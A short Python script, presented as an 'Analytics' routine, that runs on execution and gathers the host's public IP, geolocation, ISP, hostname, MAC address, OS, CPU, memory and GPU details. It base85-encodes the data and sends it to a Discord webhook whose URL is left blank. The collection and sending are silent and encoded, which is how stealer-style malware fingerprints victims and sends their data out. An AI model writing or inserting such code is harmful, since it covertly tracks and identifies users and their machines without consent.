import requests
import psutil
import platform
from datetime import datetime
import GPUtil
from tabulate import tabulate
from discord_webhook import DiscordWebhook, DiscordEmbed
import base64
import json
import uuid

headers = {
    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.126 Safari/537.36',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9'
}

def get_size(bytes, suffix="B"):
    factor = 1024
    for unit in ["", "K", "M", "G", "T", "P"]:
        if bytes < factor:
            return f"{bytes:.2f}{unit}{suffix}"
        bytes /= factor

def Analytics():
    ip_address = requests.get('https://api64.ipify.org?format=json').json()["ip"]
    response = requests.get(f'https://ipapi.co/{ip_address}/json/', headers=headers).json()
    location_data = {
        "ip": ip_address,
        "city": response.get("city"),
        "region": response.get("region"),
        "country": response.get("country_name"),
        "country_code": response.get("country_code"),
        "isp": response.get("org"),
    }
    uname = platform.uname()
    system = uname.system
    node = uname.node
    release = uname.release
    version = uname.version
    machine = uname.machine
    physical_cores = psutil.cpu_count(logical=False)
    total_cores = psutil.cpu_count(logical=True)
    cpufreq = psutil.cpu_freq()
    max_freq = f"{cpufreq.max:.2f}Mhz"
    min_freq = f"{cpufreq.min:.2f}Mhz"
    cur_freq = f"{cpufreq.current:.2f}Mhz"
    usage = f"{psutil.cpu_percent()}%"
    svmem = psutil.virtual_memory()
    total_mem = get_size(svmem.total)
    available_mem = get_size(svmem.available)
    used_mem = get_size(svmem.used)
    percent_mem = f"{svmem.percent}%"
    gpus = GPUtil.getGPUs()
    list_gpus = []
    for gpu in gpus:
        gpu_id = gpu.id
        gpu_name = gpu.name
        gpu_load = f"{gpu.load*100}%"
        gpu_free_memory = f"{gpu.memoryFree}MB"
        gpu_used_memory = f"{gpu.memoryUsed}MB"
        gpu_total_memory = f"{gpu.memoryTotal}MB"
        gpu_temperature = f"{gpu.temperature} °C"
        list_gpus.append((gpu_id, gpu_name, gpu_load, gpu_free_memory, gpu_used_memory,gpu_total_memory, gpu_temperature))

    url = ''

    compiled_ = {
        'mac': ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff)for ele in range(0,8*6,8)][::-1]),
        'node': node,
        'system': system,
        'release': release,
        'version': version,
        'machine': machine,
        'physical_cores': physical_cores,
        'total_cores': total_cores,
        'max_freq': max_freq,
        'min_freq': min_freq,
        'cur_freq': cur_freq,
        'usage': usage,
        'total_mem': total_mem,
        'available_mem': available_mem,
        'used_mem': used_mem,
        'percent_mem': percent_mem,
        'gpus': list_gpus,
        'location_data': location_data
    }

    encoded = base64.b85encode(json.dumps(compiled_).encode())

    webhook = DiscordWebhook(url=url, content='88Analytics88'+encoded.decode())
    response = webhook.execute()

Analytics()
